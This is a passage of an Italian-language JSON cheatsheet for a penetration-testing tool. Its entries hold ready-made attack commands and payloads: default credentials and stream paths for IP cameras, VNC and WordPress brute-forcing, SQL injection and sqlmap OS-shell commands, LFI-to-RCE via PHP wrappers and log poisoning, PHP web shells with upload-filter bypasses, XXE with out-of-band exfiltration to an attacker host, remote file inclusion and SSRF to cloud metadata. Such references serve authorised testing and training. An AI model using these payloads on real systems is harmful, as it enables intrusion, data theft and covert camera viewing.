    ],
    "refs": [
      {
        "label": "Cameradar — GitHub",
        "url": "https://github.com/Ullaakut/cameradar"
      }
    ]
  },
  {
    "id": "rtsp-stream",
    "name": "RTSP — apri/cattura stream",
    "category": "service-enum",
    "subcategory": "rtsp",
    "group": "Exploitation",
    "description": "Con un path valido e (se servono) le credenziali, apri o cattura il flusso video della camera. Le virgolette proteggono `?` e `&` nell'URL.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rtsp"
    ],
    "tags": [
      "rtsp",
      "camera",
      "ffmpeg",
      "stream"
    ],
    "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "admin"
      },
      {
        "key": "path",
        "label": "Stream path",
        "placeholder": "Streaming/Channels/101"
      }
    ],
    "variants": [
      {
        "id": "view",
        "label": "Guarda (ffplay)",
        "template": "ffplay 'rtsp://<user>:<password>@<ip>:554/<path>'",
        "description": "Apre il flusso in tempo reale."
      },
      {
        "id": "grab",
        "label": "Cattura frame (ffmpeg)",
        "template": "ffmpeg -i 'rtsp://<user>:<password>@<ip>:554/<path>' -frames:v 1 frame.jpg",
        "description": "Salva un singolo fotogramma come prova, senza aprire la finestra."
      },
      {
        "id": "vlc",
        "label": "VLC",
        "template": "vlc 'rtsp://<user>:<password>@<ip>:554/<path>'",
        "description": "Apre lo stream in VLC."
      }
    ],
    "note": "# Path RTSP comuni\n- Hikvision: `/Streaming/Channels/101`\n- Dahua: `/cam/realmonitor?channel=1&subtype=0`\n- Generici: `/live.sdp`, `/h264`, `/mpeg4`, `/video1`\n# Credenziali di default\n- `admin:admin` · `admin:12345` · `admin:` (vuota) · `root:root` · Dahua `888888:888888`\nSe non conosci il path, usa `cameradar` che lo trova da solo.",
    "refs": [
      {
        "label": "HackTricks — 554 Pentesting RTSP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html"
      }
    ]
  },
  {
    "id": "vnc-enum",
    "name": "VNC — nmap enum",
    "category": "service-enum",
    "subcategory": "vnc",
    "group": "Enumeration",
    "description": "VNC è un desktop remoto grafico: la porta 5900 serve il display `:0`, mentre la 5800 offre lo stesso viewer come applet Java via HTTP. La prima cosa da controllare è il tipo di autenticazione, perché molte telecamere e dispositivi IoT espongono VNC senza alcuna password.\n- `vnc-info` = versione RFB e tipi di auth (None/VNC/Tight…)\n- `realvnc-auth-bypass` = CVE-2006-2369, bypass auth su RealVNC",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "vnc"
    ],
    "tags": [
      "vnc",
      "nmap"
    ],
    "template": "nmap -p5800,5900 --script vnc-info,vnc-title,realvnc-auth-bypass <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting VNC",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
      }
    ]
  },
  {
    "id": "vnc-connect",
    "name": "VNC — connetti",
    "category": "service-enum",
    "subcategory": "vnc",
    "group": "Access",
    "description": "Connettiti al desktop VNC. Se `vnc-info` mostra auth `None` entri senza password (comune su telecamere e IoT).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "vnc"
    ],
    "tags": [
      "vnc",
      "vncviewer",
      "access"
    ],
    "template": "vncviewer <ip>:5900",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "vncviewer",
        "template": "vncviewer <ip>:5900",
        "description": "Connessione diretta al display :0. Senza auth entri subito."
      },
      {
        "id": "noneauth",
        "label": "MSF check no-auth",
        "template": "msfconsole -q -x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; run; exit\"",
        "description": "Verifica se il VNC accetta connessioni senza password."
      }
    ],
    "note": "# Porta 5800 (vnc-http)\nÈ il viewer VNC servito come applet Java via HTTP: apri `http://<ip>:5800` nel browser. Indica un VNC in ascolto sulla 5900.\n# Password VNC salvata\nUna password VNC memorizzata (config o registro) è cifrata in DES con una chiave fissa nota: decifrala con `vncpwd <file>`.",
    "refs": [
      {
        "label": "HackTricks — Pentesting VNC",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
      }
    ]
  },
  {
    "id": "vnc-brute",
    "name": "VNC — brute password",
    "category": "service-enum",
    "subcategory": "vnc",
    "group": "Access",
    "description": "VNC usa solo la password, niente username. Brute con hydra o Metasploit.\n- hydra: modulo `vnc`, solo `-P` (nessun `-l`)\n- MSF: `vnc_login`",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "vnc"
    ],
    "tags": [
      "vnc",
      "hydra",
      "brute"
    ],
    "template": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "hydra",
        "label": "hydra",
        "template": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<ip>",
        "description": "Brute della sola password (VNC non ha username)."
      },
      {
        "id": "msf",
        "label": "Metasploit",
        "template": "msfconsole -q -x \"use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit\"",
        "description": "`vnc_login` con wordlist."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting VNC",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html"
      }
    ]
  },
  {
    "id": "nxc-winrm",
    "name": "nxc winrm — check & exec",
    "category": "service-enum",
    "subcategory": "winrm",
    "group": "Shell",
    "description": "Verifica se le credenziali danno accesso WinRM: cerca il flag `(Pwn3d!)` = puoi avere una shell. `-x` esegue un comando al volo.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "winrm"
    ],
    "tags": [
      "nxc",
      "netexec",
      "winrm"
    ],
    "template": "nxc winrm <ip> -u '<user>' -p '<password>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Check accesso",
        "template": "nxc winrm <ip> -u '<user>' -p '<password>'",
        "description": "Conferma l’accesso WinRM: `(Pwn3d!)` significa che puoi prendere una shell."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "nxc winrm <ip> -u '<user>' -H '<hash>'",
        "description": "Verifica l’accesso con hash NTLM."
      },
      {
        "id": "exec",
        "label": "Esegui comando",
        "template": "nxc winrm <ip> -u '<user>' -p '<password>' -x 'whoami'",
        "description": "Esegue un comando senza aprire una shell interattiva."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 5985 Pentesting WinRM",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html"
      }
    ]
  },
  {
    "id": "nmap-rdp",
    "name": "nmap — RDP info",
    "category": "service-enum",
    "subcategory": "rdp",
    "group": "Connection",
    "description": "rdp-ntlm-info svela hostname, dominio e versione OS senza login; rdp-enum-encryption verifica se NLA è richiesto.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "nmap",
      "rdp"
    ],
    "template": "nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-rdp",
    "name": "nxc rdp — check & screenshot",
    "category": "service-enum",
    "subcategory": "rdp",
    "group": "Connection",
    "description": "Verifica credenziali RDP in massa e cattura uno screenshot della schermata di login o della sessione (`--screenshot`).",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "nxc",
      "netexec",
      "rdp"
    ],
    "template": "nxc rdp <ip> -u '<user>' -p '<password>'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Check accesso",
        "template": "nxc rdp <ip> -u '<user>' -p '<password>'",
        "description": "Conferma se le credenziali sono valide su RDP."
      },
      {
        "id": "screenshot",
        "label": "Screenshot",
        "template": "nxc rdp <ip> -u '<user>' -p '<password>' --screenshot",
        "description": "Salva uno screenshot della sessione RDP."
      },
      {
        "id": "nla-screenshot",
        "label": "Screenshot senza NLA",
        "template": "nxc rdp <ip> --nla-screenshot",
        "description": "Se NLA è disattivato, cattura la schermata di login senza credenziali."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3389 Pentesting RDP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html"
      }
    ]
  },
  {
    "id": "wpscan",
    "name": "wpscan — WordPress",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "CMS",
    "description": "Scanner WordPress: enumera plugin/temi/utenti e, con `--api-token`, mostra i CVE noti. In brute usa `-U`/`-P` contro `wp-login`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "wpscan",
      "wordpress",
      "cms"
    ],
    "template": "wpscan --url http://<ip> --enumerate ap,at,u --api-token <token>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "token",
        "label": "API token",
        "placeholder": "WPScan API token"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Enumera",
        "template": "wpscan --url http://<ip> --enumerate ap,at,u --api-token <token>",
        "description": "Enumera tutti i plugin (ap), temi (at) e utenti (u)."
      },
      {
        "id": "brute",
        "label": "Brute login",
        "template": "wpscan --url http://<ip> -U users.txt -P /usr/share/wordlists/rockyou.txt",
        "description": "Bruteforce delle password via `XML-RPC`/`wp-login` con la lista utenti trovata."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — WordPress",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html"
      }
    ]
  },
  {
    "id": "droopescan",
    "name": "droopescan — Drupal/Joomla",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "CMS",
    "description": "Scanner per Drupal e Joomla: versione, plugin e tema. Identifica la versione per cercare l’exploit giusto (es. Drupalgeddon).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "droopescan",
      "drupal",
      "joomla",
      "cms"
    ],
    "template": "droopescan scan drupal -u http://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Drupal",
        "template": "droopescan scan drupal -u http://<ip>",
        "description": "Scansione di un sito Drupal."
      },
      {
        "id": "joomla",
        "label": "Joomla",
        "template": "droopescan scan joomla -u http://<ip>",
        "description": "Scansione di un sito Joomla."
      }
    ]
  },
  {
    "id": "tomcat-manager",
    "name": "nmap — Tomcat Manager brute",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "App Server",
    "description": "Bruteforce del Tomcat Manager (`/manager/html`). Credenziali deboli → deploy di un `.war` malevolo = RCE. Default comuni: `tomcat:tomcat`, `admin:admin`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "nmap",
      "tomcat",
      "brute"
    ],
    "template": "nmap -p<port> --script http-tomcat-manager-bruteforce <ip>",
    "params": [
      {
        "key": "port",
        "label": "Port",
        "placeholder": "8080"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Tomcat",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html"
      }
    ]
  },
  {
    "id": "web-default-creds",
    "name": "Default creds — app comuni",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Default Creds",
    "description": "Prima di brute o exploit, prova le credenziali di default note:\n- Tomcat: `tomcat:tomcat`, `admin:admin`\n- Jenkins: `admin:admin` (Script Console: /script → Groovy RCE)\n- Splunk: `admin:changeme`\n- PRTG: `prtgadmin:prtgadmin` (CVE-2018-9276 command injection)",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "default-creds",
      "jenkins",
      "splunk",
      "prtg",
      "tomcat"
    ],
    "template": "curl -s -u <user>:<password> http://<ip>:<port>/",
    "params": [
      {
        "key": "user",
        "label": "User",
        "placeholder": "admin"
      },
      {
        "key": "password",
        "label": "Password",
        "placeholder": "admin"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "port",
        "label": "Port",
        "placeholder": "8080"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting Web",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      }
    ]
  },
  {
    "id": "gitlab-userenum",
    "name": "GitLab — user enumeration",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "App Server",
    "description": "L’API pubblica di GitLab elenca gli utenti senza autenticazione: utile per costruire una lista da spray. Controlla anche la versione per CVE note.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gitlab",
      "user-enum",
      "api"
    ],
    "template": "curl -s \"http://<ip>/api/v4/users?per_page=100\" | jq -r \".[].username\"",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "sqli-detect",
    "name": "SQLi — detection manuale",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SQL Injection",
    "description": "Payload rapidi per capire se un parametro è iniettabile: contenuto/errore diverso (boolean) o ritardo nella risposta (time-based).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "sqli",
      "manual"
    ],
    "template": "' OR 1=1-- -",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Boolean",
        "template": "' OR 1=1-- -",
        "description": "Se la pagina cambia rispetto al normale, il parametro è iniettabile."
      },
      {
        "id": "and",
        "label": "AND true/false",
        "template": "' AND 1=1-- -",
        "description": "Confronta con \"AND 1=2\": risposte diverse = blind boolean-based."
      },
      {
        "id": "union-null",
        "label": "UNION NULL",
        "template": "' UNION SELECT NULL-- -",
        "description": "Aggiungi NULL finché l’errore sparisce: così conti le colonne."
      },
      {
        "id": "sleep",
        "label": "Time-based",
        "template": "' AND SLEEP(5)-- -",
        "description": "Se la risposta tarda 5s è iniettabile anche senza output (blind)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — SQL Injection",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html"
      }
    ]
  },
  {
    "id": "sqli-union",
    "name": "SQLi — union-based",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SQL Injection",
    "description": "Conta le colonne con `ORDER BY`, poi estrai dati con `UNION SELECT` nelle colonne mostrate. Per DB diversi da MySQL vedi la variante cheat-sheet.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "sqli",
      "union"
    ],
    "template": "' ORDER BY 1-- -",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "ORDER BY",
        "template": "' ORDER BY 1-- -",
        "description": "Incrementa il numero finché dà errore: trovi così quante colonne ci sono."
      },
      {
        "id": "union",
        "label": "UNION version",
        "template": "' UNION SELECT 1,@@version,3-- -",
        "description": "Stampa la versione DB nella colonna visibile (qui la seconda)."
      },
      {
        "id": "crossdb",
        "label": "Cheat cross-DB",
        "template": "-- MySQL: @@version, information_schema.tables, LOAD_FILE('/etc/passwd')\n-- MSSQL: @@version, information_schema.tables, xp_cmdshell\n-- Oracle: SELECT banner FROM v$version, all_tables\n-- PostgreSQL: version(), pg_tables, pg_read_file('/etc/passwd')",
        "description": "Funzioni equivalenti sui principali DBMS."
      }
    ]
  },
  {
    "id": "sqlmap",
    "name": "sqlmap — automatizzato",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SQL Injection",
    "description": "Automatizza detection ed estrazione delle SQLi.\n- `--batch` = usa i default, nessuna domanda interattiva\n- `--dbs` = elenca i database (poi scendi a tabelle e dump)\n- `--os-shell` = tenta la RCE sul DBMS",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "sqlmap",
      "sqli"
    ],
    "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      },
      {
        "key": "table",
        "label": "Table",
        "placeholder": "users"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Enum DB",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
        "description": "Elenca i database."
      },
      {
        "id": "tables",
        "label": "Tabelle",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> --tables",
        "description": "Tabelle del database scelto."
      },
      {
        "id": "dump",
        "label": "Dump",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> -T <table> --dump",
        "description": "Estrae i dati della tabella."
      },
      {
        "id": "osshell",
        "label": "OS shell",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --os-shell",
        "description": "Tenta una shell sul DBMS (serve privilegio FILE o stacked queries)."
      },
      {
        "id": "burp",
        "label": "Da request Burp",
        "template": "sqlmap -r request.txt --batch --dbs",
        "description": "Usa una request salvata: gestisce header, cookie e POST automaticamente."
      }
    ],
    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` = testa solo quel parametro, più veloce che provarli tutti. Es. `-p id`.\n- `*` = marcatore manuale del punto di injection: mettilo dove vuoi iniettare (path REST, header, valore JSON) e sqlmap prova lì. Es. `/api/user/1*` oppure `id=1*` in una request salvata (`-r`).",
    "refs": [
      {
        "label": "HackTricks — sqlmap",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
      }
    ]
  },
  {
    "id": "lfi",
    "name": "LFI — path traversal",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "Risali le directory per leggere file di sistema. Su Windows usa i backslash. Combinala con i wrapper PHP per leggere sorgenti o ottenere RCE.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "lfi",
      "path-traversal"
    ],
    "template": "http://<ip>/page?file=../../../../etc/passwd",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "/etc/passwd",
        "template": "http://<ip>/page?file=../../../../etc/passwd",
        "description": "Lettura classica su Linux."
      },
      {
        "id": "shadow",
        "label": "/etc/shadow",
        "template": "http://<ip>/page?file=../../../../etc/shadow",
        "description": "Hash delle password (serve permesso di lettura, raro)."
      },
      {
        "id": "windows",
        "label": "Windows hosts",
        "template": "http://<ip>/page?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "description": "Path traversal su Windows (backslash)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — File Inclusion",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html"
      }
    ]
  },
  {
    "id": "lfi-wrappers",
    "name": "LFI — PHP wrappers",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "I wrapper PHP trasformano una LFI in lettura del sorgente (`php://filter`) o in esecuzione di codice PHP (`php://input`, `data://`). La RCE con input/data richiede `allow_url_include=On`; il filter no.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "lfi",
      "php",
      "wrapper"
    ],
    "template": "http://<ip>/page?file=php://filter/convert.base64-encode/resource=index.php",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "filter (base64)",
        "template": "http://<ip>/page?file=php://filter/convert.base64-encode/resource=index.php",
        "description": "Legge il sorgente di `index.php` in base64 (poi lo decodifichi). Non esegue nulla, quindi non serve `allow_url_include`."
      },
      {
        "id": "input",
        "label": "php://input",
        "template": "curl -s \"http://<ip>/page?file=php://input&cmd=id\" --data '<?php system($_GET[\"cmd\"]); ?>'",
        "description": "Il PHP va nel body POST (`--data`) e `php://input` lo esegue; il comando arriva da `&cmd=`. Non funziona da browser (serve il POST). Richiede `allow_url_include=On`."
      },
      {
        "id": "data",
        "label": "data://",
        "template": "http://<ip>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id",
        "description": "La base64 è `<?php system($_GET['cmd']);?>`; il comando arriva da `&cmd=`. Richiede `allow_url_include=On`."
      }
    ]
  },
  {
    "id": "lfi-logpoison",
    "name": "LFI — log poisoning → RCE",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "lfi",
      "log-poisoning",
      "rce"
    ],
    "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/\n# poi includi il log via LFI per eseguire:\nhttp://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "rfi",
    "name": "RFI — remote file inclusion",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "Se `allow_url_include` è attivo, includi una shell PHP ospitata da te. Serve un web server in ascolto (es. `python3 -m http.server 80`).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "rfi",
      "php",
      "rce"
    ],
    "template": "http://<ip>/page?file=http://<lhost>/shell.php",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ]
  },
  {
    "id": "xxe",
    "name": "XXE — XML External Entity",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "XXE",
    "description": "Definisci un’entità esterna per leggere file o esfiltrare dati. Usa CDATA per file con caratteri speciali, blind OOB quando l’output non torna in risposta.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "xxe",
      "xml"
    ],
    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<root>&xxe;</root>",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Basic (file read)",
        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<root>&xxe;</root>",
        "description": "Legge `/etc/passwd` se l’app riflette il valore dell’entità in risposta."
      },
      {
        "id": "blind",
        "label": "Blind OOB",
        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>\n<root>&send;</root>",
        "description": "`xxe.dtd` ospitato da te: `<!ENTITY send SYSTEM \"http://<lhost>/?data=%file;\">`, esfiltra via HTTP quando l’output non è mostrato."
      },
      {
        "id": "error",
        "label": "Error-based",
        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>",
        "description": "Il dtd remoto usa un’entità non valida per far comparire il contenuto del file nel messaggio d’errore."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — XXE",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
      }
    ]
  },
  {
    "id": "cmdi",
    "name": "Command Injection",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Command Injection",
    "description": "Concatena un comando al parametro vulnerabile. Se c’è un filtro, prova i bypass (quote interne, `${IFS}` al posto degli spazi).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "command-injection",
      "rce"
    ],
    "template": "; whoami",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Operatori",
        "template": "; whoami",
        "description": "Prova anche: | whoami · || whoami · & whoami · && whoami · $(whoami) · `whoami`."
      },
      {
        "id": "quote",
        "label": "Bypass con quote",
        "template": "w'h'o'a'm'i",
        "description": "Le quote vuote vengono rimosse dalla shell: aggira i filtri su parole chiave."
      },
      {
        "id": "ifs",
        "label": "Bypass spazi ($IFS)",
        "template": "cat${IFS}/etc/passwd",
        "description": "Usa `${IFS}` (o `$IFS`) quando lo spazio è filtrato."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Command Injection",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/command-injection.html"
      }
    ]
  },
  {
    "id": "file-upload",
    "name": "File Upload — bypass",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Upload",
    "description": "Carica una web shell aggirando i controlli: estensione alternativa, Content-Type falso, magic bytes immagine, doppia estensione.",
    "note": "# 🔥 MIME-Type\nUn altro meccanismo, ben più comune e robusto rispetto al semplice controllo dell'estensione del file, è rappresentato dalla **verifica del MIME-Type**, ossia il tipo di contenuto del file. Il MIME (*Multipurpose Internet Mail Extensions*) è uno standard che identifica il tipo di file in base al suo contenuto reale, analizzando la sua struttura in byte piuttosto che basarsi unicamente sull'estensione.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "file-upload",
      "webshell",
      "rce"
    ],
    "template": "<?php system($_GET['cmd']); ?>",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Web shell PHP",
        "template": "<?php system($_GET['cmd']); ?>",
        "description": "Shell PHP minimale; poi richiama `?cmd=id`. Per IIS usa `ASPX`, per Tomcat `JSP`."
      },
      {
        "id": "ext",
        "label": "Bypass estensione",
        "template": "shell.phtml / shell.php5 / shell.pHp / shell.php%00.jpg",
        "description": "Estensioni alternative che il server esegue comunque come PHP."
      },
      {
        "id": "magic",
        "label": "Bypass magic bytes",
        "template": "GIF89a;\n<?php system($_GET['cmd']); ?>",
        "description": "Prefisso `GIF89a` per passare i controlli che leggono i primi byte."
      },
      {
        "id": "ctype",
        "label": "Bypass Content-Type",
        "template": "Content-Type: image/jpeg",
        "description": "In Burp cambia l’header mantenendo il contenuto PHP."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — File Upload",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"
      }
    ]
  },
  {
    "id": "ssrf",
    "name": "SSRF — Server-Side Request Forgery",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SSRF",
    "description": "Fai partire la richiesta dal server: raggiungi servizi interni o l’endpoint metadata cloud. Se c’è un filtro, usa rappresentazioni alternative dell’IP.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ssrf"
    ],
    "template": "http://<ip>/fetch?url=http://127.0.0.1:8080",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Servizio interno",
        "template": "http://<ip>/fetch?url=http://127.0.0.1:8080",
        "description": "Accedi a un servizio in ascolto solo su localhost."
      },
      {
        "id": "cloud",
        "label": "Cloud metadata",
        "template": "http://<ip>/fetch?url=http://169.254.169.254/latest/meta-data/",
        "description": "Endpoint metadata AWS: spesso espone credenziali IAM temporanee."
      },
      {
        "id": "bypass",
        "label": "Bypass filtro",
        "template": "http://127.1/  ·  http://0x7f000001/  ·  http://[::1]/",
        "description": "Rappresentazioni alternative di 127.0.0.1 per aggirare le blacklist."
